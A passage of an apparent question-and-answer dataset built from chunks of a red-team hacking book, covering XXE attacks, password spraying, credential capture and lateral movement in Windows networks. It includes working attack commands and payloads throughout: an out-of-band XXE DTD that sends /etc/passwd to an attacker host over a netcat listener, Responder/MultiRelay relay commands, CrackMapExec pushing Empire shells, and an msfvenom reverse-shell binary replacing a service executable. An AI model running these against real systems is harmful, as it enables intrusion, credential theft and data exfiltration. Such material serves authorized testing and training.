VMWare Virtual\nMachine for the XXE attack. This can be found here:\nhttp://thehackerplaybook.com/get.php?type=XXE-vm\nOnce downloaded, open the virtual machine in VMWare and boot it up. At the\nlogin screen, you don't need to login, but you should see the IP address of the\nsystem.\nGo to browser:\nProxy all traffic through Burp Suite\nGo to the URL: http://[IP of your Virtual Machine]\nIntercept traffic and hit \"Hack the XML\"\nIf you view the HTML source code of the page after loading it, there is a hidden\nfield that is submitted via a POST request. The XML content looks like:\n<?xml version=\"1.0\" ?>\n<!DOCTYPE thp [\n<!ELEMENT thp ANY>\n<!ENTITY book \"Universe\">\n]>\n<thp>Hack The &book;</thp>\nIn this example, we specified that it is XML version 1.0, DOCTYPE, specified\nthe root element is thp, !ELEMENT specifies ANY type, and !ENTITY sets the\nbook to the string \"Universe\". Lastly, within our XML output, we want to print\nout our entity from parsing the XML file.\nThis is normally what you might see in an application that sends XML data.\nSince we control the POST data that has the XML request, we can try to inject\nour own malicious entities. By default, most XML parsing libraries support the\nSYSTEM keyword that allows data to be read from a URI (including locally\nfrom the system using the file:// protocol). So we can create our own entity to\ncraft a file read on etcpasswd.\nOriginal XML File Malicious XML\n<?xml version=\"1.0\" ?> <?xml version=\"1.0\" ?>\n<!DOCTYPE thp [ <!DOCTYPE thp [\n<!ELEMENT thp ANY> <!ELEMENT thp ANY>\n<!ENTITY book \"Universe\"> <!ENTITY book SYSTEM\n]> \"file://etcpasswd\">\n<thp>Hack The &book;</thp> ]>\n<thp>Hack The &book;</thp>\nXXE Lab - Read File:\nIntercept traffic and hit \"Hack the XML\" for [IP of Your\nVM]/xxe.php\nSend the intercepted traffic to Repeater\nModify the \"data\" POST parameter to the following:\n<?xml version=\"1.0\" ?><!DOCTYPE thp [ <!ELEMENT\nthp ANY><!ENTITY book SYSTEM\n\"file://etcpasswd\">]><thp>Hack The\n%26book%3B</thp>\nNote that %26 = & and %3B = ;. We will need to percent encode the\nampersand and semicolon character.\nSubmit the traffic and we should be able to read etcpasswd\nAdvanced XXE - Out Of Band (XXE-OOB)\nIn the previous attack, we were able to get the response back in the <thp> tags.\nWhat if we couldn’t see the response or ran into character/file restrictions? How\ncould we get our data to send Out Of Band (OOB)? Instead of defining our\nattack in the request payload, we can supply a remote Document Type Definition\n(DTD) file to perform an OOB-XXE. A DTD is a well-structured XML file that\ndefines the structure and the legal elements and attributes of an XML document.\nFor sake of ease, our DTD will contain all of our attack/exfil payloads, which\nwill help us get around a lot of the character limitations. In our lab example, we\nare going to cause the vulnerable XXE server to request a DTD hosted on a\nremote server.\nOur new XXE attack will be performed in four stages:\nModified XXE XML Attack\nFor the Vulnerable XML Parser to grab a DTD file from an\nAttacker's Server\nDTD file contains code to read the etcpasswd file\nDTD file contains code to exfil the contents of the data out\n(potentially encoded)\nSetting up our Attacker Box and XXE-OOB Payload:\nInstead of the original File Read, we are going to specify an external\nDTD file\n<!ENTITY % dtd SYSTEM\n\"http://[Your_IP]/payload.dtd\"> %dtd;\nThe new \"data\" POST payload will look like the following\n(remember to change [Your_IP]):\n<?xml version=\"1.0\"?><!DOCTYPE thp [<!ELEMENT\nthp ANY ><!ENTITY % dtd SYSTEM\n\"http://[YOUR_IP]/payload.dtd\"> %dtd;]><thp>\n<error>%26send%3B</error></thp>\nWe are going to need to host this payload on our attacker server by\ncreating a file called payload.dtd\ngedit varwww/html/payload.dtd\n<!ENTITY % file SYSTEM \"file://etcpasswd\">\n<!ENTITY % all \"<!ENTITY send SYSTEM\n'http://[Your_IP]:8888/collect=%file;'>\">\n%all;\nThe DTD file you just created instructs the vulnerable server to read\netcpasswd and then try to make a web request with our sensitive data\nback to our attacker machine. To make sure we receive our response,\nwe need to spin up a web server to host the DTD file and set up a\nNetCat listener\nnc -l -p 8888\nYou are going to run across an error that looks something like the\nfollowing: simplexml_load_string(): parser error : Detected an entity\nreference loop in <b>varwww/html/xxe.php</b> on line <b>20.\nWhen doing XXE attacks, it is common to run into parser errors.\nMany times XXE parsers only allow certain characters, so reading\nfiles with special characters will break the parser. What we can do to\nresolve this? In the case with PHP, we can use PHP input/output\nstreams ( http://php.net/manual/en/wrappers.php.php) to read local files and\nbase64 encode them using php://filter/read=convert.base64-encode.\nLet's restart our NetCat listener and change our payload.dtd file to\nuse this feature:\n<!ENTITY % file SYSTEM\n\"php://filter/read=convert.base64-\nencode/resource=file://etcpasswd\">\n<!ENTITY % all \"<!ENTITY send SYSTEM\n'http://[Your_IP]:8888/collect=%file;'>\">\n%all;\nOnce we repeat our newly modified request, we can now see that our victim\nserver first grabs the payload.dtd file, processes it, and makes a secondary web\nrequest to your NetCat handler listening on port 8888. Of course, the GET\nrequest will be base64 encoded and we will have to decode the request.\nMore XXE payloads:\nhttps://gist.github.com/staaldraad/01415b990939494879b4\nhttps://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-\nFuzzing.txt\nConclusion\nAlthough this is only a small glimpse of all the different web attacks you may\nencounter, the hope was to open your eyes to how these newer frameworks are\nintroducing old and new attacks. Many of the common vulnerability and\napplication scanners tend to miss a lot of these more complex vulnerabilities due\nto the fact that they are language or framework specific. The main point I\nwanted to make was that in order to perform an adequate review, you need to\nreally understand the language and frameworks.",
    "question": "What is Server Side Request Forgery (SSRF) and how can it be used to access internal network services or read local files on a server?",
    "summary": "Server Side Request Forgery (SSRF) allows attackers to make unauthorized requests from a server to internal or local resources, potentially gaining access to sensitive data or services. It can be used to read local files, scan internal networks, and move laterally within a system. XML External Entity (XXE) attacks exploit XML parsers by injecting malicious entities that can read files or exfiltrate data, often requiring special techniques to bypass restrictions. Both SSRF and XXE are critical vulnerabilities that can be overlooked by standard scanners, emphasizing the need for in-depth understanding of the underlying technologies."
  },
  {
    "start": 48,
    "end": 48,
    "text": "4 the drive - compromising the network\nOn day two of your assessment, you ran nmap on the whole network, kicked off\nvulnerability scanners with no luck, and were not able to identify an initial entry\npoint on any of their web applications. Slightly defeated, you take a step back\nand review all your reconnaissance notes. You know that once you can get into\nthe network, there are a myriad of tricks you can use to obtain more credentials,\npivot between boxes, abuse features in Active Directory, and find the space loot\nwe all crave. Of course, you know that it won't be an easy task. There will be\nnumerous trip wires to bypass, guards to misguide, and tracks to cover.\nIn the last THP book, The Drive section focused on using findings from the\nvulnerability scanners and exploiting them. This was accomplished using tools\nlike Metasploit, printer exploits, Heartbleed, Shellshock, SQL injections, and\nother types of common exploits. More recently, there have been many great\ncode execution vulnerabilities like Eternal Blue (MS017-10), multiple Jenkins\nexploits, Apache Struts 2, CMS applications, and much more. Since this is the\nRed Team version of THP, we won't focus extensively on how to use these tools\nor exploits for specific vulnerabilities. Instead, we will focus on how to abuse\nthe corporate environments and live off of the land.\nIn this chapter, you will be concentrating on Red Team tactics, abusing the\ncorporate infrastructure, getting credentials, learning about the internal network,\nand pivoting between hosts and networks. We will be doing this without ever\nrunning a single vulnerability scanner.",
    "question": "What is the main focus of the Red Team section in this chapter compared to the previous THP book's The Drive section?",
    "summary": "On day two of the assessment, initial entry points into the network could not be found using Nmap or vulnerability scanners. The focus shifts to Red Team tactics, emphasizing the exploitation of corporate environments and internal network infrastructure without relying on vulnerability scanners. The goal is to obtain credentials, pivot between systems, and uncover valuable information within the network."
  },
  {
    "start": 49,
    "end": 51,
    "text": "Finding Credentials from Outside the Network\nAs a Red Teamer, finding the initial entry point can be complex and will require\nplenty of resources. In the past books, we have cloned our victim's\nauthentication pages, purchased doppelganger domains, target spear phished,\ncreated custom malware, and more.\nSometimes, I tell my Red Teams to just . . . keep it simple. Many times we come\nup with these crazy advanced plans, but what ends up working is the most basic\nplan. This is one of the easiest…\nOne of the most basic techniques that has been around is password bruteforcing.\nBut, as Red Teamers, we must look at how to do this smartly. As companies\ngrow, they require more technologies and tools. For an attacker, this definitely\nopens up the playing field. When companies start to open to the internet, we\nstart to see authentication required for email (i.e. Office 365 or OWA),\ncommunication (i.e. Lync, XMPP, WebEx) tools, collaboration tools (i.e. JIRA,\nSlack, Hipchat, Huddle), and other external services (i.e. Jenkins, CMS sites,\nSupport sites). These are the targets we want to go after.\nThe reason we try to attack these servers/services is because we are looking for\napplications that authenticate against the victim’s LDAP/Active Directory (AD)\ninfrastructure. This could be through some AD federation, Single SignOn\nprocess, or directly to AD. We need to find some common credentials to utilize\nin order to move on to the secondary attack. From the reconnaissance phase, we\nfound and identified a load of email and username accounts, which we will use\nto attack through what is called Password Spraying. We are going to target all\nthe different applications and try to guess basic passwords as we’ve seen this in\nreal world APT style campaigns (US-CERT Article: http://bit.ly/2qyB9rb) Why\nshould we test authentication against different external services?\nSome authentication sources do not log attempts from external\nservices\nAlthough we generally see email or VPN requiring two-factor\nauthentication, externally-facing chat systems may not\nPassword reuse is very high\nSometimes external services do not lock out AD accounts on\nmultiple bad attempts\nThere are many tools that do bruteforcing, however, we are going to focus on\njust a couple of them. The first one is a tool from Spiderlabs\n(http://bit.ly/2EJve6N) called Spray. Although Spray is a little more\ncomplicated to use, I really like the concept of the services it sprays. For\nexample, they support SMB, OWA, and Lync (Microsoft Chat).\nTo use spray, you specify the following:\nspray.sh -owa <targetIP> <usernameList> <passwordList>\n<AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes>\n<Domain>\nAs you will see in the example below, we ran it against a fake OWA mail server\non cyberspacekittens (which doesn't exist anymore) and when it got to peter with\npassword Spring2018, it found a successful attempt (you can tell by the data\nlength).\nA question I often get involves which passwords to try, as you only get a number\nof password attempts before you lock out an account. There is no right answer\nfor this and is heavily dependent on the company. We used to be able to use\nvery simple passwords like \"Password123\", but those have become more rare to\nfind. The passwords that do commonly give us at least one credential are:\nSeason + Year\nLocal Sports Team + Digits\nLook at older breaches, find users for the target company and use\nsimilar passwords\nCompany name + Year/Numbers/Special Characters (!, $, #, @)\nIf we can get away with it, we run these scans 24/7 slowly, as not to trigger any\naccount lockouts. Remember, it only takes one password to get our foot in the\ndoor!\nThis is a quick script that utilizes Curl to authenticate to OWA.\nConfiguring Spray is pretty simple and can be easily converted for other\napplications. What you need to do is capture the POST request for a password\nattempt (you can do this in Burp Suite), copy all the request data, and save it to a\nfile. For any fields that will be bruteforced, you will need to supply the string\n\"sprayuser\" and \"spraypassword\".\nFor example, in our case the post-request.txt file would look like the following:\nPOST owaauth.owa HTTP/1.1\nHost: mail.cyberspacekittens.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101\nFirefox/52.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://mail.cyberspacekittens.comowaauth/logon.aspx?\nreplaceCurrent=1&url=https%3a%2f%2fmail.cyberspacekittens.com%2fowa%2f\nCookie: ClientId=VCSJKT0FKWJDYJZIXQ; PrivateComputer=true;\nPBack=0\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 131\ndestination=https%3A%2F%2Fcyberspacekittens.com%2Fowa%2F&flags=4&forcedownlevel=0&username=\nAs mentioned before, one additional benefit of spray.sh is that it supports SMB\nand Lync as well. Another tool that takes advantage of and abuses the results\nfrom Spraying is called Ruler (https://github.com/sensepost/ruler). Ruler is a\ntool written by Sensepost that allows you to interact with Exchange servers\nthrough either the MAPI/HTTP or RPC/HTTP protocol. Although we are\nmainly going to be talking about using Ruler for bruteforcing/info-gathering, this\ntool also supports some persistence exploitation attacks, which we will lightly\ntouch on.\nThe first feature we can abuse is similar to the Spray tool, which bruteforces\nthrough users and passwords. Ruler will take in a list of usernames and\npasswords, and attempt to find credentials. It will automatically try to\nautodiscover the necessary Exchange configurations and attempt to find\ncredentials. To run Ruler:\nruler --domain cyberspacekittens.com brute --users ./users.txt --\npasswords ./passwords.txt\nOnce we find a single password, we can then use Ruler to dump all the users in\nthe O365 Global Address List (GAL) to find more email addresses and the email\ngroups to which they belong.\nTaking these email addresses, we should be able to send all these accounts\nthrough the bruteforce tool and find even more credentials—this is the circle of\npasswords. The main purpose of the Ruler tool though, is that once you have\ncredentials, you can abuse \"features\" in Office/Outlook to create rules and forms\non a victim's email account. Here is a great write-up from SensePost on how\nthey were able to abuse these features to execute Macros that contain our Empire\npayload: https://sensepost.com/blog/2017/outlook-forms-and-shells/.\nIf you don't decide to use the Outlook forms or if the features have been\ndisabled, we can always go back to the good ol' attacks on email. This is where\nit does make you feel a little dirty, as you will have to log in as one of the users\nand read all their email. After we have a couple good chuckles from reading\ntheir emails, we will want to find an existing conversation with someone who\nthey seem to trust somewhat (but not good friends). Since they already have a\nrapport built, we want to take advantage of that and send them malware.\nTypically, we would modify one of their conversations with an attachment (like\nan Office file/executable), resend it to them, but this time with our malicious\nagent. Using these trusted connections and emails from internal addresses\nprovides great cover and success.\nOne point I am going to keep mentioning throughout the book is that the overall\ncampaign is built to test the Blue Teams on their detection tools/processes. We\nwant to do certain tasks and see if they will be able to alert or be able to\nforensically identify what happened. For this portion of the lab, I love validating\nif the company can determine that someone is exfiltrating their users’ emails.\nSo, what we do is dump all of the compromised emails using a Python script:\nhttps://github.com/Narcolapser/python-o365#email. In many cases, this can be\ngigabytes of data!\nAdvanced Lab\nA great exercise would be to take the different authentication type services and\ntest them all for passwords. Try and build a password spray tool that tests\nauthentication against XMPP services, common third-party SaaS tools, and other\ncommon protocols. Even better would be to do this from multiple VPS boxes,\nall controlled from a single master server.\nMoving Through the Network\nAs a Red Teamer, we want to move through the network as quietly as possible.\nWe want to use \"features\" that allow us to find and abuse information about the\nnetwork, users, services, and more. Generally, on a Red Team campaign, we do\nnot want to run any vulnerability scans within an environment. There are even\ntimes where we might not even want to run a nmap scan against an internal\nnetwork. This is because many companies have gotten pretty good at detecting\nthese types of sweeps, especially when running something as loud as a\nvulnerability scanner.\nIn this section, you will be focusing on moving through Cyber Space Kittens'\nnetwork without setting off any detections. We will assume you have already\nsomehow gotten onto the network and started to either look for your first set of\ncredentials or have a shell on a user's machine.\nSetting Up the Environment - Lab Network\nThis part is completely optional, but because of Microsoft licensing, there aren't\nany pre-canned VM labs to follow with the book. So it is up to you now to build\na lab!\nThe only way to really learn how to attack environments it to fully build it out\nyourself. This gives you a much clearer picture of what you are attacking, why\nthe attacks work or fail, and understand limitations of certain tools or processes.\nSo what kind of lab do you need to build? You will probably need one for both\nWindows and Linux (and maybe even Mac) based on your client's environment.\nIf you are attacking corporate networks, you will probably have to build out a\nfull Active Directory network. In the following lab, we will go over how to\nbuild a lab for all the examples in this book.\nAn ideal Windows testing lab for you to create at home might look something\nlike the following:\nDomain Controller - Server: [ Windows 2016 Domain Controller]\nWeb server: [IIS on Windows 2016]\nClient Machines: [Windows 10] x 3 and [Windows 7] x 2\nAll running on VMWare Workstation with at least 16 GB of RAM\nand 500GB SSD hard drive\nConfiguring and Creating a Domain Controller:\nMicrosoft Directions on building a 2016 server:\nhttps://blogs.technet.microsoft.com/canitpro/2017/02/22/step-\nby-step-setting-up-active-directory-in-windows-server-\n2016/\nBit.ly Link: http://bit.ly/2JN8E19\nOnce Active Directory is installed and configured, create users and\ngroups with: dsac.exe\nCreate multiple users\nCreate groups and assign to Users:\nSpace\nHelpdesk\nLab\nSet up Client Machines (Windows 7/10) to Join the Domain:\nUpdate all machines\nJoin the machines to the Domain\nhttps://helpdeskgeek.com/how-to/windows-join-domain/\nMake sure to add one domain user with the ability to run as local\nadministrator on each box. This can be accomplished by adding that\ndomain user to the local administrators group on the local machine.\nEnable local administrator on each host and set password\nSet up GPO to:\nDisable Firewall (https://www.youtube.com/watch?v=vxXLJSbx1SI)\nDisable AV (http://bit.ly/2EL0uTd)\nDisable Updates\nAdd Helpdesk to the local administrators group\nOnly Allow Login for Domain Admins, Local Administrators,\nhelpdesk (http://bit.ly/2qyJs5D)\nLastly, link your GPO to your root domain\nSet all users for each OS to autologin (it just makes life much easier for testing).\nEvery time a machine starts or reboots, it will autologin so that we can easily test\nattacks that pull credentials from memory:\nhttps://support.microsoft.com/en-us/help/324737/how-to-turn-on-\nautomatic-logon-in-windows\nBit.ly Link: http://bit.ly/2EKatIk\nSet up IIS Server and configure SPN:\nhttps://www.rootusers.com/how-to-install-iis-in-windows-server-\n2016/\nBit.ly Link: http://bit.ly/2JJQvRK\nhttps://support.microsoft.com/en-us/help/929650/how-to-use-spns-\nwhen-you-configure-web-applications-that-are-hosted-on\nBit.ly Link: http://bit.ly/2IXZygL",
    "question": "What are the common techniques and tools used by Red Teamers to find and exploit credentials across various external services of a target organization?",
    "summary": "As a Red Teamer, finding initial credentials often involves simple methods like password spraying rather than complex attacks. By targeting external services that authenticate against the victim's LDAP/Active Directory, such as email and chat systems, Red Teams can uncover common passwords used across different platforms. Tools like Spray and Ruler are used to efficiently test these services, and once credentials are found, they can be leveraged to move deeper into the network and gather more information."
  },
  {
    "start": 52,
    "end": 54,
    "text": "On the Network with No Credentials\nLet’s say you were unable to get any passwords from Spraying their external\nservices and therefore decide that you want to sneak into the building. You wait\nuntil after lunchtime, walk over to their Cyber Space Kittens' offices, and find\nthe smokers door. Even though you don't smoke, you know that the smokers\nhave that gang mentality. You light up a cigarette, chat with the workers about\nnothing, and as they walk into their building, you follow them in . . . no\nquestions asked!\nNow that you have broken into the CSK facility, you don't want to get caught by\nstaying there too long. You pull out your trusty drop box, find an empty office,\nplug it into the network, check your phone to see that it beaconed home, and\nswiftly walk back to safety.\nSlightly sweating at home, you quickly jump onto your laptop, log into your\nVPN server, and give a sigh of relief as your drop box beacons are still\nconnecting home. Now that you can SSH into your drop box, which contains all\nyour hacker tools, you can slowly discover the client's network, pivot between\nboxes, and try to get to the data you care about.\nResponder\nJust like in the previous campaign, we used Responder\n(https://github.com/lgandx/Responder) to listen on the network and spoof\nresponses to gain credentials on the network. As a recap from The Hacker\nPlaybook 2, when a system on the network makes a DNS hostname lookup that\nfails, that victim system uses Link-Local Multicast Name Resolution (LLMNR\nfor short) and the Net-BIOS Name Service (NBT-NS) for fallback name\nresolution. When that victim PC fails the DNS lookup, the victim starts asking\nanyone on the network if they know the resolution for that hostname.\nAn easy and general example: let's say your PC has a fixed mounted drive for\n\\\\cyberspacekittenssecretdrive\\secrets. One day, the IT department removes that\nshare drive from the network and it no longer exists. Due to the fact you still\nhave a mounted drive for the server name, cyberspacekittenssecretdrive, your\nsystem will continually ask the network if anyone knows the IP for it. Now, this\nfile share example could be rare to find; however, because there is a high\nlikelihood that a previously connected system no longer exists on the network,\nthis issue will still occur. We have seen this from mounted drives, applications\nthat have hardcoded servers, and many times, just misconfigurations.\nWe can use a tool like Responder to take advantage of those systems looking for\na hostname and respond to it with our malicious server. Even better is that\nResponder can go a step above and act as a WPAD (Web Proxy Auto-Discovery\nProtocol) server, proxying all data through our attacker server, but that is a\nwhole other attack.\ncd optResponder\n./Responder.py -I eth0 -wrf\nNow, since we are in a Windows Enterprise Environment, we can make the\nassumption that it most likely is running Active Directory. So, if we can respond\nto the DNS lookup from our victim host, we can make their system connect to\nour SMB share. Since they are connecting to the drive\n\\\\cyberspacekittenssecretdrive, we are going to force the victim to authenticate\nwith their NTLMv2 credentials (or cached credentials). These credentials that\nwe capture will not be straight NTLM hashes, but they will be NTLM\nChallenge/Response hashes (NTLMv2-SSP). The only issue with these hashes\nis that they are immensely slower to crack than the normal NTLM hashes, but\nthis isn't a huge problem these days with large cracking boxes at our disposal\n(see cracking section).\nWe can take the NTLMv2 hash, pass it over to hashcat, and crack the\npasswords. Within hashcat, we need to specify the hash format \"-m\"\n(https://hashcat.net/wiki/doku.php?id=example_hashes) for NetNTLMv2.\nhashcat -m 5600 hashes\\ntlmssp_hashes.txt passwordlists/*\nNow, let's say we don't really want to crack hashes or we don't mind possibly\nalerting the user to something suspicious. What we can do is force a basic auth\npop-up instead of requiring the use of NetNTLMv2 credentials by using the F\n(ForceWpadAuth) and b (basic auth).\npython ./Responder.py -I eth0 -wfFbv\nAs you can see from the image above, the user will be prompted for a username\nand password, which most people will just blindly enter. Once they submit their\ncredentials, we will be able to capture them in clear text!\nBetter Responder (MultiRelay.py)\nThe problem with Responder and cracking NTLMv2-SSP hashes is that the time\nit takes to crack these hashes can be extensive. Worse, we have been in\nenvironments where the passwords for administrators are 20+ characters. So,\nwhat can we do in these scenarios? If the environment does not enforce SMB\nsigning (which we can find with a quick nmap script scan -\nhttps://nmap.org/nsedoc/scripts/smb-security-mode.html), we can do a slick little\ntrick with replaying the SMB request we captured.\nLaurent Gaffie included a tool in Responder to handle authentication replay\nattacks. Per Laurent's site, \"MultiRelay is a powerful pentest utility included in\nResponder's tools folder, giving you the ability to perform targeted NTLMv1 and\nNTLMv2 relay on a selected target. Currently MultiRelay relays HTTP,\nWebDav, Proxy and SMB authentications to an SMB server. This tool can be\ncustomized to accept a range of users to relay to a target. The concept behind\nthis is to only target domain Administrators, local Administrators, or privileged\naccounts.” [http://g-laurent.blogspot.com/2016/10/introducing-responder-\nmultirelay-10.html]\nFrom a high level, instead of forcing the victim to authenticate to our SMB\nshare, MultiRelay will forward any authentication requests will be forwarded to\na victim host of our choice. Of course, that relayed user will need to have access\ninto that other machine; however, if successful, we don't need to deal with any\npasswords or cracking. To get started, we need to configure our Responder and\nMultiRelay:\nEdit the Responder config file to disable SMB and HTTP servers\ngedit Responder.conf\nChange SMB and HTTP to Off\nStart Responder\npython ./Responder.py -I eth0 -rv\nStart MultiRelay in a New Terminal Window\noptResponder/tools\n./MultiRelay.py -t <target host> -c <shell command> -u\nALL\nOnce the Relay to a victim host is achievable, we need to think about what we\nwant to execute on our victim workstation. By default, MultiRelay can spawn a\nbasic shell, but we can also automatically execute Meterpreter PowerShell\npayloads, Empire PowerShell payloads, our dnscat2 PowerShell payload,\nPowerShell Scripts to Download and Execute C2 agents, Mimikatz, or just run\ncalc.exe for kicks.\nReferences\nhttp://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-\nand-replay-them/\nPowerShell Responder\nOnce we compromise a Windows system, we can use PowerShell off our victim\nto do Responder style attacks. Both features of the original Responder can be\nperformed through the following two tools:\nInveigh - https://github.com/Kevin-\nRobertson/Inveigh/blob/master/Scripts/Inveigh.ps1\nInveigh-Relay\nTo make things even easier, all this is already built into Empire.",
    "question": "How can an attacker use Responder and MultiRelay to gain credentials on a Windows network without cracking NTLMv2-SSP hashes?",
    "summary": "The text explains how to bypass network authentication by using Responder to spoof responses and capture credentials. It also describes how to use MultiRelay to relay authentication requests to a target host without cracking hashes. Additionally, it mentions using PowerShell-based tools like Inveigh or Empire to perform similar attacks on compromised Windows systems."
  },
  {
    "start": 55,
    "end": 55,
    "text": "User Enumeration Without Credentials\nOnce on the network, we might be able to use Responder to get credentials or\nshells, but there are also times when both SMB signing is enabled and cracking\nNTLMv2 SSP isn't viable. That is when we take a step back and start with the\nbasics. Without actively scanning the network yet, we need to get a list of users\n(could be for password spraying or even social engineering).\nOne option is to start enumerating users against the Domain Controller.\nHistorically (back in the 2003 era), we could try to perform RID cycling to get a\nlist of all user accounts. Although this is no longer available, there are other\noptions to bruteforce accounts. One option is to abuse Kerberos:\nnmap -p88 --script krb5-enum-users --script-args krb5-enum-\nusers.realm=\"cyberspacekittens.local\",userdb=/opt/userlist.txt\n<Domain Controller IP>\nWe will need to supply a list of usernames to test, but since we are only querying\nthe DC and not authenticating it, this activity is generally not detected. Now, we\ncan take these user accounts and start password spraying again!",
    "question": "How can we enumerate user accounts on a Domain Controller without using credentials?",
    "summary": "User enumeration without credentials can be done by querying the Domain Controller using tools like Nmap and Kerberos scripts. This method allows obtaining a list of user accounts, which can then be used for password spraying. An example command uses Nmap to enumerate users via Kerberos without authentication, making it less likely to be detected."
  },
  {
    "start": 56,
    "end": 66,
    "text": "Scanning the Network with CrackMapExec (CME)\nIf we don't have a compromised system yet, but we did gain credentials through\nResponder, misconfigured web app, bruteforcing, or a printer, then we can try to\nsweep the network to see where this account can log in. A simple sweep using a\ntool like CrackMapExec (cme) can assist in finding that initial point of entry on\nthe internal network.\nHistorically, we have used CME to scan the network, identify/authenticate via\nSMB on the network, execute commands remotely to many hosts, and even pull\nclear text creds via Mimikatz. With newer features in both Empire and CME,\nwe can take advantage of Empire's REST feature. In the following scenario, we\nare going to spin up Empire with its REST API, configure the password in CME,\nhave CME connect to Empire, scan the network with the single credential we\nhave, and finally, if we do authenticate, automatically push an Empire payload to\nthe remote victim's system. If you have a helpdesk or privileged account, get\nready for a load of Empire shells!\nStart Empire's REST API server\ncd optEmpire\n./empire --rest --password 'hacktheuniverse'\nChange the CrackMapExec Password\ngedit root.cme/cme.conf\npassword=hacktheuniverse\nRun CME to spawn Empire shells\ncme smb 10.100.100.0/24 -d 'cyberspacekittens.local' -u\n'<username>' -p '<password>' -M empire_exec -o\nLISTENER=http\nAfter Compromising Your Initial Host\nAfter you have gained access to a host via social engineering, drop boxes,\nresponder, attacking printers or other attacks, what do you do next? That is\nalways the million dollar question.\nIn the past, it was all about understanding where you are and your immediate\nsurrounding network. We may initially run commands similar to \"netstat -ano\"\nto find the locations of our IP ranges of the victim's servers, domains, and user.\nWe can also run commands like \"ps\" or \"sc queryex type= service state= all |\nfind \"_NAME\"\" to list all the running services and look for AV or other host\nbase protections. Here are some other example commands we might initially\nrun: Network information:\nnetstat -anop | findstr LISTEN\nnet group \"Domain Admins\" /domain\nProcess List:\ntasklist /v\nSystem Host Information:\nsysinfo\nGet-WmiObject -class win32 operatingsystem | select -property * |\nexportcsv c:\\temp\\os.txt\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nSimple File Search:\ndir /s *password*\nfindstr s n i p foo *\nfindstr /si pass *.txt | .xml | .ini\nInformation From Shares/Mounted Drives:\npowershell -Command \"get-WmiObject -class Win32_Share\"\npowershell -Command \"get-PSDrive\"\npowershell -Command \"Get-WmiObject -Class\nWin32_MappedLogicalDisk | select Name, ProviderName”\nLet's be real here, no one has time to remember all of these commands, but we\nare in luck! I believe, based on the RTFM book (great resource), leostat created\na quick Python script that has a ton of these handy commands easily searchable\nin a tool called rtfm.py (https://github.com/leostat/rtfm).\nUpdate and Run RTFM\ncd optrtfm\nchmod +x rtfm.py\n./rtfm.py -u\n./rtfm.py -c 'rtfm'\nSearch all Tags\n./rtfm.py -Dt\nLook at all the queries/commands per tag. One I like to use is the\nEnumeration category\n./rtfm.py -t enumeration | more\nNow, RTFM is pretty extensive and has a lot of different helpful commands.\nThis is a great quick resource during any campaign.\nThese are all the things we have been doing forever to get information, but what\nif we could get much more from the environment? Using PowerShell, we can\ngain the network/environment information that we need. Since PowerShell can\nbe easily executed from any of the C2 tools, you can use Empire, Metasploit, or\nCobalt Strike to perform these labs. In the following examples, we will be using\nEmpire, but feel free to try other tools.\nPrivilege Escalation\nThere are plenty of different ways to go from a regular user to a privileged\naccount.\nUnquoted Service Paths:\nThis is a fairly easy and common vulnerability where the service\nexecutable path is not surrounded by quotes. This is abused because,\nwithout quotes around the path, we can abuse a current service. Let's\nsay we have a service that is configured to execute C:\\Program Files\n(x86)\\Cyber Kittens\\Cyber Kittens.exe. If we have write permissions\ninto the Cyber Kittens folder, we can drop malware to be located at\nC:\\Program Files (x86)\\Cyber Kittens\\Cyber.exe (notice that\nKittens.exe is missing). If the service runs at system, we can wait\nuntil the service restarts, and have our malware run as a privileged\naccount.\nHow to Find Vulnerable Service Paths:\nwmic service get name,displayname,pathname,startmode\n|findstr i \"Auto\" |findstr i v \"C:\\Windows\\\" |findstr i /v \"\"\"\nLook for BINARY_PATH_NAME\nFinding Insecure Registry Permissions for Services:\nIdentify weak permissions that allow update of service Image Path\nlocations\nCheck if the AlwaysInstallElevated registry key is enabled:\nChecks the AlwaysInstallElevated registry keys which dictates if\n.MSI files should be installed with elevated privileges (NT\nAUTHORITY\\SYSTEM)\nhttps://github.com/rapid7/metasploit-\nframework/blob/master/modules/exploits/windows/local/always_install_elevated.rb\nNote that we don't really have to do these manually as a few good Metasploit\nand PowerShell modules have been created especially for Windows. In the\nfollowing example, we are going to take a look at PowerUp PowerShell script\n(https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/PowerUp.ps1).\nIn this case, the script is in conjunction with Empire and will run all common\nareas of misconfiguration that allow for a regular user to get a local\nadministrative or system account. In the example below, we ran this on our\nvictim system and saw that it had some unquoted service paths for localsystem.\nNow, we might not be able to restart the service, but we should be able to abuse\nthe vulnerability and wait for a reboot.\nEmpire PowerUp Module:\nusermodule privesc/powerup/allchecks\nWhat sticks out right away:\nServiceName : WavesSysSvc\nPath : C:\\Program\nFiles\\Waves\\MaxxAudio\\WavesSysSvc64.exe\nModifiableFile : C:\\Program\nFiles\\Waves\\MaxxAudio\\WavesSysSvc64.exe\nModifiableFilePermissions : {WriteOwner, Delete, WriteAttributes,\nSynchronize...}\nModifiableFileIdentityReference : Everyone\nStartName : LocalSystem\nIt looks like the WavesSysSyc service is writeable by everyone. That means we\ncan replace the WaveSysSvc64.exe file with a malicious binary of our own:\nCreate a Meterpreter Binary (will discuss later how to get around\nAV)\nmsfvenom -p windows/meterpreter/reverse_https\nLHOST=[ip] LPORT=8080 -f exe > shell.exe\nUpload the binary using Empire and replace the original binary\nupload ./shell.exe C:\\\\users\\\\test\\\\shell.exe\nshell copy C:\\users\\test\\Desktop\\shell.exe \"C:\\Program\nFiles\\Waves\\MaxxAudio\\WavesSysSvc64.exe\"\nRestart Service or wait for a reboot\nOnce the service restarts, you should get your Meterpreter shell back as system!\nUsing PowerUp, you will find many different services that are potentially\nvulnerable to privilege escalation. If you want a deeper primer on the underlying\nissues with Windows privesc, check out FuzzSecurity's article:\nhttp://www.fuzzysecurity.com/tutorials/16.html.\nFor unpatched Windows systems, we do have some go-to privilege escalation\nattacks like (https://github.com/FuzzySecurity/PowerShell-\nSuite/blob/master/Invoke-MS16-032.ps1) 